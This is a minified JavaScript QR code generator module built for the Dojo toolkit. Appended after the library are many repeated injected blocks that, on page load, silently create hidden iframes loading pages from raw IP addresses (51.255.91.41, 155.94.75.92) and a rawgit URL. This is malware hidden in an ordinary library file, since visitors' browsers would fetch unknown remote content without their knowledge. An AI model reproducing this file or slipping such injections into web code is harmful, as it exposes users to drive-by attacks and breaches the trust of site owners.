//>>built
define(["dojo","dijit","dojox"],function(C,D,E){var v;(function(){function y(a){this.mode=q.MODE_8BIT_BYTE;this.data=a;this.parsedData=[];a=0;for(var b=this.data.length;a<b;a++){var c=[],d=this.data.charCodeAt(a);65536<d?(c[0]=240|(d&1835008)>>>18,c[1]=128|(d&258048)>>>12,c[2]=128|(d&4032)>>>6,c[3]=128|d&63):2048<d?(c[0]=224|(d&61440)>>>12,c[1]=128|(d&4032)>>>6,c[2]=128|d&63):128<d?(c[0]=192|(d&1984)>>>6,c[1]=128|d&63):c[0]=d;this.parsedData.push(c)}this.parsedData=Array.prototype.concat.apply([],
this.parsedData);this.parsedData.length!=this.data.length&&(this.parsedData.unshift(191),this.parsedData.unshift(187),this.parsedData.unshift(239))}function u(a,b){this.typeNumber=a;this.errorCorrectLevel=b;this.modules=null;this.moduleCount=0;this.dataCache=null;this.dataList=[]}function w(a,b){if(void 0==a.length)throw Error(a.length+"/"+b);for(var c=0;c<a.length&&0==a[c];)c++;this.num=Array(a.length-c+b);for(b=0;b<a.length-c;b++)this.num[b]=a[b+c]}function r(a,b){this.totalCount=a;this.dataCount=
b}function z(){this.buffer=[];this.length=0}function A(){var a=!1,b=navigator.userAgent;/android/i.test(b)&&(a=!0,(aMat=b.toString().match(/android ([0-9]\.[0-9])/i))&&aMat[1]&&(a=parseFloat(aMat[1])));return a}y.prototype={getLength:function(a){return this.parsedData.length},write:function(a){for(var b=0,c=this.parsedData.length;b<c;b++)a.put(this.parsedData[b],8)}};u.prototype={addData:function(a){a=new y(a);this.dataList.push(a);this.dataCache=null},isDark:function(a,b){if(0>a||this.moduleCount<=
a||0>b||this.moduleCount<=b)throw Error(a+","+b);return this.modules[a][b]},getModuleCount:function(){return this.moduleCount},make:function(){this.makeImpl(!1,this.getBestMaskPattern())},makeImpl:function(a,b){this.moduleCount=4*this.typeNumber+17;this.modules=Array(this.moduleCount);for(var c=0;c<this.moduleCount;c++){this.modules[c]=Array(this.moduleCount);for(var d=0;d<this.moduleCount;d++)this.modules[c][d]=null}this.setupPositionProbePattern(0,0);this.setupPositionProbePattern(this.moduleCount-
7,0);this.setupPositionProbePattern(0,this.moduleCount-7);this.setupPositionAdjustPattern();this.setupTimingPattern();this.setupTypeInfo(a,b);7<=this.typeNumber&&this.setupTypeNumber(a);null==this.dataCache&&(this.dataCache=u.createData(this.typeNumber,this.errorCorrectLevel,this.dataList));this.mapData(this.dataCache,b)},setupPositionProbePattern:function(a,b){for(var c=-1;7>=c;c++)if(!(-1>=a+c||this.moduleCount<=a+c))for(var d=-1;7>=d;d++)-1>=b+d||this.moduleCount<=b+d||(this.modules[a+c][b+d]=
0<=c&&6>=c&&(0==d||6==d)||0<=d&&6>=d&&(0==c||6==c)||2<=c&&4>=c&&2<=d&&4>=d?!0:!1)},getBestMaskPattern:function(){for(var a=0,b=0,c=0;8>c;c++){this.makeImpl(!0,c);var d=m.getLostPoint(this);if(0==c||a>d)a=d,b=c}return b},createMovieClip:function(a,b,c){a=a.createEmptyMovieClip(b,c);this.make();for(b=0;b<this.modules.length;b++){c=1*b;for(var d=0;d<this.modules[b].length;d++){var e=1*d;this.modules[b][d]&&(a.beginFill(0,100),a.moveTo(e,c),a.lineTo(e+1,c),a.lineTo(e+1,c+1),a.lineTo(e,c+1),a.endFill())}}return a},
setupTimingPattern:function(){for(var a=8;a<this.moduleCount-8;a++)null==this.modules[a][6]&&(this.modules[a][6]=0==a%2);for(a=8;a<this.moduleCount-8;a++)null==this.modules[6][a]&&(this.modules[6][a]=0==a%2)},setupPositionAdjustPattern:function(){for(var a=m.getPatternPosition(this.typeNumber),b=0;b<a.length;b++)for(var c=0;c<a.length;c++){var d=a[b],e=a[c];if(null==this.modules[d][e])for(var f=-2;2>=f;f++)for(var h=-2;2>=h;h++)this.modules[d+f][e+h]=-2==f||2==f||-2==h||2==h||0==f&&0==h?!0:!1}},setupTypeNumber:function(a){for(var b=
m.getBCHTypeNumber(this.typeNumber),c=0;18>c;c++){var d=!a&&1==(b>>c&1);this.modules[Math.floor(c/3)][c%3+this.moduleCount-8-3]=d}for(c=0;18>c;c++)d=!a&&1==(b>>c&1),this.modules[c%3+this.moduleCount-8-3][Math.floor(c/3)]=d},setupTypeInfo:function(a,b){b=m.getBCHTypeInfo(this.errorCorrectLevel<<3|b);for(var c=0;15>c;c++){var d=!a&&1==(b>>c&1);6>c?this.modules[c][8]=d:8>c?this.modules[c+1][8]=d:this.modules[this.moduleCount-15+c][8]=d}for(c=0;15>c;c++)d=!a&&1==(b>>c&1),8>c?this.modules[8][this.moduleCount-
c-1]=d:9>c?this.modules[8][15-c-1+1]=d:this.modules[8][15-c-1]=d;this.modules[this.moduleCount-8][8]=!a},mapData:function(a,b){for(var c=-1,d=this.moduleCount-1,e=7,f=0,h=this.moduleCount-1;0<h;h-=2)for(6==h&&h--;;){for(var g=0;2>g;g++)if(null==this.modules[d][h-g]){var n=!1;f<a.length&&(n=1==(a[f]>>>e&1));m.getMask(b,d,h-g)&&(n=!n);this.modules[d][h-g]=n;e--; -1==e&&(f++,e=7)}d+=c;if(0>d||this.moduleCount<=d){d-=c;c=-c;break}}}};u.PAD0=236;u.PAD1=17;u.createData=function(a,b,c){b=r.getRSBlocks(a,
b);for(var d=new z,e=0;e<c.length;e++){var f=c[e];d.put(f.mode,4);d.put(f.getLength(),m.getLengthInBits(f.mode,a));f.write(d)}for(e=a=0;e<b.length;e++)a+=b[e].dataCount;if(d.getLengthInBits()>8*a)throw Error("code length overflow. ("+d.getLengthInBits()+"\x3e"+8*a+")");for(d.getLengthInBits()+4<=8*a&&d.put(0,4);0!=d.getLengthInBits()%8;)d.putBit(!1);for(;!(d.getLengthInBits()>=8*a);){d.put(u.PAD0,8);if(d.getLengthInBits()>=8*a)break;d.put(u.PAD1,8)}return u.createBytes(d,b)};u.createBytes=function(a,
b){for(var c=0,d=0,e=0,f=Array(b.length),h=Array(b.length),g=0;g<b.length;g++){var n=b[g].dataCount,k=b[g].totalCount-n,d=Math.max(d,n),e=Math.max(e,k);f[g]=Array(n);for(var l=0;l<f[g].length;l++)f[g][l]=255&a.buffer[l+c];c+=n;l=m.getErrorCorrectPolynomial(k);n=(new w(f[g],l.getLength()-1)).mod(l);h[g]=Array(l.getLength()-1);for(l=0;l<h[g].length;l++)k=l+n.getLength()-h[g].length,h[g][l]=0<=k?n.get(k):0}for(l=g=0;l<b.length;l++)g+=b[l].totalCount;a=Array(g);for(l=c=0;l<d;l++)for(g=0;g<b.length;g++)l<
f[g].length&&(a[c++]=f[g][l]);for(l=0;l<e;l++)for(g=0;g<b.length;g++)l<h[g].length&&(a[c++]=h[g][l]);return a};for(var q={MODE_NUMBER:1,MODE_ALPHA_NUM:2,MODE_8BIT_BYTE:4,MODE_KANJI:8},t={L:1,M:0,Q:3,H:2},m={PATTERN_POSITION_TABLE:[[],[6,18],[6,22],[6,26],[6,30],[6,34],[6,22,38],[6,24,42],[6,26,46],[6,28,50],[6,30,54],[6,32,58],[6,34,62],[6,26,46,66],[6,26,48,70],[6,26,50,74],[6,30,54,78],[6,30,56,82],[6,30,58,86],[6,34,62,90],[6,28,50,72,94],[6,26,50,74,98],[6,30,54,78,102],[6,28,54,80,106],[6,32,
58,84,110],[6,30,58,86,114],[6,34,62,90,118],[6,26,50,74,98,122],[6,30,54,78,102,126],[6,26,52,78,104,130],[6,30,56,82,108,134],[6,34,60,86,112,138],[6,30,58,86,114,142],[6,34,62,90,118,146],[6,30,54,78,102,126,150],[6,24,50,76,102,128,154],[6,28,54,80,106,132,158],[6,32,58,84,110,136,162],[6,26,54,82,110,138,166],[6,30,58,86,114,142,170]],G15:1335,G18:7973,G15_MASK:21522,getBCHTypeInfo:function(a){for(var b=a<<10;0<=m.getBCHDigit(b)-m.getBCHDigit(m.G15);)b^=m.G15<<m.getBCHDigit(b)-m.getBCHDigit(m.G15);
return(a<<10|b)^m.G15_MASK},getBCHTypeNumber:function(a){for(var b=a<<12;0<=m.getBCHDigit(b)-m.getBCHDigit(m.G18);)b^=m.G18<<m.getBCHDigit(b)-m.getBCHDigit(m.G18);return a<<12|b},getBCHDigit:function(a){for(var b=0;0!=a;)b++,a>>>=1;return b},getPatternPosition:function(a){return m.PATTERN_POSITION_TABLE[a-1]},getMask:function(a,b,c){switch(a){case 0:return 0==(b+c)%2;case 1:return 0==b%2;case 2:return 0==c%3;case 3:return 0==(b+c)%3;case 4:return 0==(Math.floor(b/2)+Math.floor(c/3))%2;case 5:return 0==
b*c%2+b*c%3;case 6:return 0==(b*c%2+b*c%3)%2;case 7:return 0==(b*c%3+(b+c)%2)%2;default:throw Error("bad maskPattern:"+a);}},getErrorCorrectPolynomial:function(a){for(var b=new w([1],0),c=0;c<a;c++)b=b.multiply(new w([1,p.gexp(c)],0));return b},getLengthInBits:function(a,b){if(1<=b&&10>b)switch(a){case q.MODE_NUMBER:return 10;case q.MODE_ALPHA_NUM:return 9;case q.MODE_8BIT_BYTE:return 8;case q.MODE_KANJI:return 8;default:throw Error("mode:"+a);}else if(27>b)switch(a){case q.MODE_NUMBER:return 12;
case q.MODE_ALPHA_NUM:return 11;case q.MODE_8BIT_BYTE:return 16;case q.MODE_KANJI:return 10;default:throw Error("mode:"+a);}else if(41>b)switch(a){case q.MODE_NUMBER:return 14;case q.MODE_ALPHA_NUM:return 13;case q.MODE_8BIT_BYTE:return 16;case q.MODE_KANJI:return 12;default:throw Error("mode:"+a);}else throw Error("type:"+b);},getLostPoint:function(a){for(var b=a.getModuleCount(),c=0,d=0;d<b;d++)for(var e=0;e<b;e++){for(var f=0,h=a.isDark(d,e),g=-1;1>=g;g++)if(!(0>d+g||b<=d+g))for(var n=-1;1>=n;n++)0>
e+n||b<=e+n||0==g&&0==n||h!=a.isDark(d+g,e+n)||f++;5<f&&(c+=3+f-5)}for(d=0;d<b-1;d++)for(e=0;e<b-1;e++)if(f=0,a.isDark(d,e)&&f++,a.isDark(d+1,e)&&f++,a.isDark(d,e+1)&&f++,a.isDark(d+1,e+1)&&f++,0==f||4==f)c+=3;for(d=0;d<b;d++)for(e=0;e<b-6;e++)a.isDark(d,e)&&!a.isDark(d,e+1)&&a.isDark(d,e+2)&&a.isDark(d,e+3)&&a.isDark(d,e+4)&&!a.isDark(d,e+5)&&a.isDark(d,e+6)&&(c+=40);for(e=0;e<b;e++)for(d=0;d<b-6;d++)a.isDark(d,e)&&!a.isDark(d+1,e)&&a.isDark(d+2,e)&&a.isDark(d+3,e)&&a.isDark(d+4,e)&&!a.isDark(d+
5,e)&&a.isDark(d+6,e)&&(c+=40);for(e=f=0;e<b;e++)for(d=0;d<b;d++)a.isDark(d,e)&&f++;return c+Math.abs(100*f/b/b-50)/5*10}},p={glog:function(a){if(1>a)throw Error("glog("+a+")");return p.LOG_TABLE[a]},gexp:function(a){for(;0>a;)a+=255;for(;256<=a;)a-=255;return p.EXP_TABLE[a]},EXP_TABLE:Array(256),LOG_TABLE:Array(256)},k=0;8>k;k++)p.EXP_TABLE[k]=1<<k;for(k=8;256>k;k++)p.EXP_TABLE[k]=p.EXP_TABLE[k-4]^p.EXP_TABLE[k-5]^p.EXP_TABLE[k-6]^p.EXP_TABLE[k-8];for(k=0;255>k;k++)p.LOG_TABLE[p.EXP_TABLE[k]]=k;
w.prototype={get:function(a){return this.num[a]},getLength:function(){return this.num.length},multiply:function(a){for(var b=Array(this.getLength()+a.getLength()-1),c=0;c<this.getLength();c++)for(var d=0;d<a.getLength();d++)b[c+d]^=p.gexp(p.glog(this.get(c))+p.glog(a.get(d)));return new w(b,0)},mod:function(a){if(0>this.getLength()-a.getLength())return this;for(var b=p.glog(this.get(0))-p.glog(a.get(0)),c=Array(this.getLength()),d=0;d<this.getLength();d++)c[d]=this.get(d);for(d=0;d<a.getLength();d++)c[d]^=
p.gexp(p.glog(a.get(d))+b);return(new w(c,0)).mod(a)}};r.RS_BLOCK_TABLE=[[1,26,19],[1,26,16],[1,26,13],[1,26,9],[1,44,34],[1,44,28],[1,44,22],[1,44,16],[1,70,55],[1,70,44],[2,35,17],[2,35,13],[1,100,80],[2,50,32],[2,50,24],[4,25,9],[1,134,108],[2,67,43],[2,33,15,2,34,16],[2,33,11,2,34,12],[2,86,68],[4,43,27],[4,43,19],[4,43,15],[2,98,78],[4,49,31],[2,32,14,4,33,15],[4,39,13,1,40,14],[2,121,97],[2,60,38,2,61,39],[4,40,18,2,41,19],[4,40,14,2,41,15],[2,146,116],[3,58,36,2,59,37],[4,36,16,4,37,17],[4,
36,12,4,37,13],[2,86,68,2,87,69],[4,69,43,1,70,44],[6,43,19,2,44,20],[6,43,15,2,44,16],[4,101,81],[1,80,50,4,81,51],[4,50,22,4,51,23],[3,36,12,8,37,13],[2,116,92,2,117,93],[6,58,36,2,59,37],[4,46,20,6,47,21],[7,42,14,4,43,15],[4,133,107],[8,59,37,1,60,38],[8,44,20,4,45,21],[12,33,11,4,34,12],[3,145,115,1,146,116],[4,64,40,5,65,41],[11,36,16,5,37,17],[11,36,12,5,37,13],[5,109,87,1,110,88],[5,65,41,5,66,42],[5,54,24,7,55,25],[11,36,12],[5,122,98,1,123,99],[7,73,45,3,74,46],[15,43,19,2,44,20],[3,45,
15,13,46,16],[1,135,107,5,136,108],[10,74,46,1,75,47],[1,50,22,15,51,23],[2,42,14,17,43,15],[5,150,120,1,151,121],[9,69,43,4,70,44],[17,50,22,1,51,23],[2,42,14,19,43,15],[3,141,113,4,142,114],[3,70,44,11,71,45],[17,47,21,4,48,22],[9,39,13,16,40,14],[3,135,107,5,136,108],[3,67,41,13,68,42],[15,54,24,5,55,25],[15,43,15,10,44,16],[4,144,116,4,145,117],[17,68,42],[17,50,22,6,51,23],[19,46,16,6,47,17],[2,139,111,7,140,112],[17,74,46],[7,54,24,16,55,25],[34,37,13],[4,151,121,5,152,122],[4,75,47,14,76,48],
[11,54,24,14,55,25],[16,45,15,14,46,16],[6,147,117,4,148,118],[6,73,45,14,74,46],[11,54,24,16,55,25],[30,46,16,2,47,17],[8,132,106,4,133,107],[8,75,47,13,76,48],[7,54,24,22,55,25],[22,45,15,13,46,16],[10,142,114,2,143,115],[19,74,46,4,75,47],[28,50,22,6,51,23],[33,46,16,4,47,17],[8,152,122,4,153,123],[22,73,45,3,74,46],[8,53,23,26,54,24],[12,45,15,28,46,16],[3,147,117,10,148,118],[3,73,45,23,74,46],[4,54,24,31,55,25],[11,45,15,31,46,16],[7,146,116,7,147,117],[21,73,45,7,74,46],[1,53,23,37,54,24],
[19,45,15,26,46,16],[5,145,115,10,146,116],[19,75,47,10,76,48],[15,54,24,25,55,25],[23,45,15,25,46,16],[13,145,115,3,146,116],[2,74,46,29,75,47],[42,54,24,1,55,25],[23,45,15,28,46,16],[17,145,115],[10,74,46,23,75,47],[10,54,24,35,55,25],[19,45,15,35,46,16],[17,145,115,1,146,116],[14,74,46,21,75,47],[29,54,24,19,55,25],[11,45,15,46,46,16],[13,145,115,6,146,116],[14,74,46,23,75,47],[44,54,24,7,55,25],[59,46,16,1,47,17],[12,151,121,7,152,122],[12,75,47,26,76,48],[39,54,24,14,55,25],[22,45,15,41,46,16],
[6,151,121,14,152,122],[6,75,47,34,76,48],[46,54,24,10,55,25],[2,45,15,64,46,16],[17,152,122,4,153,123],[29,74,46,14,75,47],[49,54,24,10,55,25],[24,45,15,46,46,16],[4,152,122,18,153,123],[13,74,46,32,75,47],[48,54,24,14,55,25],[42,45,15,32,46,16],[20,147,117,4,148,118],[40,75,47,7,76,48],[43,54,24,22,55,25],[10,45,15,67,46,16],[19,148,118,6,149,119],[18,75,47,31,76,48],[34,54,24,34,55,25],[20,45,15,61,46,16]];r.getRSBlocks=function(a,b){var c=r.getRsBlockTable(a,b);if(void 0==c)throw Error("bad rs block @ typeNumber:"+
a+"/errorCorrectLevel:"+b);a=c.length/3;b=[];for(var d=0;d<a;d++)for(var e=c[3*d+0],f=c[3*d+1],h=c[3*d+2],g=0;g<e;g++)b.push(new r(f,h));return b};r.getRsBlockTable=function(a,b){switch(b){case t.L:return r.RS_BLOCK_TABLE[4*(a-1)+0];case t.M:return r.RS_BLOCK_TABLE[4*(a-1)+1];case t.Q:return r.RS_BLOCK_TABLE[4*(a-1)+2];case t.H:return r.RS_BLOCK_TABLE[4*(a-1)+3]}};z.prototype={get:function(a){return 1==(this.buffer[Math.floor(a/8)]>>>7-a%8&1)},put:function(a,b){for(var c=0;c<b;c++)this.putBit(1==
(a>>>b-c-1&1))},getLengthInBits:function(){return this.length},putBit:function(a){var b=Math.floor(this.length/8);this.buffer.length<=b&&this.buffer.push(0);a&&(this.buffer[b]|=128>>>this.length%8);this.length++}};var x=[[17,14,11,7],[32,26,20,14],[53,42,32,24],[78,62,46,34],[106,84,60,44],[134,106,74,58],[154,122,86,64],[192,152,108,84],[230,180,130,98],[271,213,151,119],[321,251,177,137],[367,287,203,155],[425,331,241,177],[458,362,258,194],[520,412,292,220],[586,450,322,250],[644,504,364,280],
[718,560,394,310],[792,624,442,338],[858,666,482,382],[929,711,509,403],[1003,779,565,439],[1091,857,611,461],[1171,911,661,511],[1273,997,715,535],[1367,1059,751,593],[1465,1125,805,625],[1528,1190,868,658],[1628,1264,908,698],[1732,1370,982,742],[1840,1452,1030,790],[1952,1538,1112,842],[2068,1628,1168,898],[2188,1722,1228,958],[2303,1809,1283,983],[2431,1911,1351,1051],[2563,1989,1423,1093],[2699,2099,1499,1139],[2809,2213,1579,1219],[2953,2331,1663,1273]],k=function(){var a=function(a,c){this._el=
a;this._htOption=c};a.prototype.draw=function(a){function c(a,b){a=document.createElementNS("http://www.w3.org/2000/svg",a);for(var c in b)b.hasOwnProperty(c)&&a.setAttribute(c,b[c]);return a}var b=this._htOption,e=this._el,f=a.getModuleCount();this.clear();var h=c("svg",{viewBox:"0 0 "+String(f)+" "+String(f),width:"100%",height:"100%",fill:b.colorLight});h.setAttributeNS("http://www.w3.org/2000/xmlns/","xmlns:xlink","http://www.w3.org/1999/xlink");e.appendChild(h);h.appendChild(c("rect",{fill:b.colorDark,
width:"1",height:"1",id:"template"}));for(b=0;b<f;b++)for(e=0;e<f;e++)if(a.isDark(b,e)){var g=c("use",{x:String(b),y:String(e)});g.setAttributeNS("http://www.w3.org/1999/xlink","href","#template");h.appendChild(g)}};a.prototype.clear=function(){for(;this._el.hasChildNodes();)this._el.removeChild(this._el.lastChild)};return a}(),B="svg"===document.documentElement.tagName.toLowerCase()?k:"undefined"==typeof CanvasRenderingContext2D?function(){var a=function(a,c){this._el=a;this._htOption=c};a.prototype.draw=
function(a){for(var c=this._htOption,b=this._el,e=a.getModuleCount(),f=Math.floor(c.width/e),h=Math.floor(c.height/e),g=['\x3ctable style\x3d"border:0;border-collapse:collapse;"\x3e'],n=0;n<e;n++){g.push("\x3ctr\x3e");for(var k=0;k<e;k++)g.push('\x3ctd style\x3d"border:0;border-collapse:collapse;padding:0;margin:0;width:'+f+"px;height:"+h+"px;background-color:"+(a.isDark(n,k)?c.colorDark:c.colorLight)+';"\x3e\x3c/td\x3e');g.push("\x3c/tr\x3e")}g.push("\x3c/table\x3e");b.innerHTML=g.join("");a=b.childNodes[0];
b=(c.width-a.offsetWidth)/2;c=(c.height-a.offsetHeight)/2;0<b&&0<c&&(a.style.margin=c+"px "+b+"px")};a.prototype.clear=function(){this._el.innerHTML=""};return a}():function(){function a(){this._elImage.src=this._elCanvas.toDataURL("image/png");this._elImage.style.display="block";this._elCanvas.style.display="none"}function b(a,c){var b=this;b._fFail=c;b._fSuccess=a;null===b._bSupportDataURI?(a=document.createElement("img"),c=function(){b._bSupportDataURI=!1;b._fFail&&_fFail.call(b)},a.onabort=c,
a.onerror=c,a.onload=function(){b._bSupportDataURI=!0;b._fSuccess&&b._fSuccess.call(b)},a.src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHxgljNBAAO9TXL0Y4OHwAAAABJRU5ErkJggg\x3d\x3d"):!0===b._bSupportDataURI&&b._fSuccess?b._fSuccess.call(b):!1===b._bSupportDataURI&&b._fFail&&b._fFail.call(b)}if(this._android&&2.1>=this._android){var c=1/window.devicePixelRatio,d=CanvasRenderingContext2D.prototype.drawImage;CanvasRenderingContext2D.prototype.drawImage=
function(a,b,e,n,k,l,m,p,q){if("nodeName"in a&&/img/i.test(a.nodeName))for(var f=arguments.length-1;1<=f;f--)arguments[f]*=c;else"undefined"==typeof p&&(arguments[1]*=c,arguments[2]*=c,arguments[3]*=c,arguments[4]*=c);d.apply(this,arguments)}}var e=function(a,b){this._bIsPainted=!1;this._android=A();this._htOption=b;this._elCanvas=document.createElement("canvas");this._elCanvas.width=b.width;this._elCanvas.height=b.height;a.appendChild(this._elCanvas);this._el=a;this._oContext=this._elCanvas.getContext("2d");
this._bIsPainted=!1;this._elImage=document.createElement("img");this._elImage.alt="Scan me!";this._elImage.style.display="none";this._el.appendChild(this._elImage);this._bSupportDataURI=null};e.prototype.draw=function(a){var b=this._elImage,c=this._oContext,d=this._htOption,e=a.getModuleCount(),f=d.width/e,k=d.height/e,m=Math.round(f),p=Math.round(k);b.style.display="none";this.clear();for(b=0;b<e;b++)for(var q=0;q<e;q++){var u=a.isDark(b,q),r=q*f,t=b*k;c.strokeStyle=u?d.colorDark:d.colorLight;c.lineWidth=
1;c.fillStyle=u?d.colorDark:d.colorLight;c.fillRect(r,t,f,k);c.strokeRect(Math.floor(r)+.5,Math.floor(t)+.5,m,p);c.strokeRect(Math.ceil(r)-.5,Math.ceil(t)-.5,m,p)}this._bIsPainted=!0};e.prototype.makeImage=function(){this._bIsPainted&&b.call(this,a)};e.prototype.isPainted=function(){return this._bIsPainted};e.prototype.clear=function(){this._oContext.clearRect(0,0,this._elCanvas.width,this._elCanvas.height);this._bIsPainted=!1};e.prototype.round=function(a){return a?Math.floor(1E3*a)/1E3:a};return e}();
v=function(a,b){this._htOption={width:256,height:256,typeNumber:4,colorDark:"#000000",colorLight:"#ffffff",correctLevel:t.H};"string"===typeof b&&(b={text:b});if(b)for(var c in b)this._htOption[c]=b[c];"string"==typeof a&&(a=document.getElementById(a));this._android=A();this._el=a;this._oQRCode=null;this._oDrawing=new B(this._el,this._htOption);this._htOption.text&&this.makeCode(this._htOption.text)};v.prototype.makeCode=function(a){var b=this._htOption.correctLevel,c=1,d;d=encodeURI(a).toString().replace(/\%[0-9a-fA-F]{2}/g,
"a");d=d.length+(d.length!=a?3:0);for(var e=0,f=x.length;e<=f;e++){var h=0;switch(b){case t.L:h=x[e][0];break;case t.M:h=x[e][1];break;case t.Q:h=x[e][2];break;case t.H:h=x[e][3]}if(d<=h)break;else c++}if(c>x.length)throw Error("Too long data");this._oQRCode=new u(c,this._htOption.correctLevel);this._oQRCode.addData(a);this._oQRCode.make();this._el.title=a;this._oDrawing.draw(this._oQRCode);this.makeImage()};v.prototype.makeImage=function(){"function"==typeof this._oDrawing.makeImage&&(!this._android||
3<=this._android)&&this._oDrawing.makeImage()};v.prototype.clear=function(){this._oDrawing.clear()};v.CorrectLevel=t;window.QRCode=v})()});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});